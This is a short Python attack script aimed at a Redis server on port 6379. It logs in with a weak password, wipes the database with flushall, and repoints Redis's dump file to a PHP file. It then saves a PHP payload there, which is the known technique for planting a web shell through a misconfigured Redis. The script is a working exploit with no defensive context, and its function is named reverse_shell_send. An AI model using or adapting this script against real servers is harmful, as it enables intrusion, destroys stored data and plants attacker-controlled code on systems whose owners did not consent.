from base64 import decode, encode, encodebytes
from email import message
from encodings import utf_8
import re
import socket
target_ip = "127.0.0.1"
target_port = 6379

def reverse_shell_send(ip,port):
    message0 = str.encode('auth 123456 \n')
    message1 = str.encode('flushall \n')
    message2 = str.encode('config set dir C:\\ \n')
    message3 = str.encode('config set dbfilename shell.php \n')
    message4 = str.encode("set 'webshell' '<?php phpinfo();?>' \n")
    message5 = str.encode('save \n')
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(message0)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message1)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message2)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)
    

    s.send(message3)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message4)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

    s.send(message5)
    res = s.recv(1024).decode('utf-8').strip('\n')
    print(res)

if __name__ == "__main__":
    reverse_shell_send(target_ip, target_port)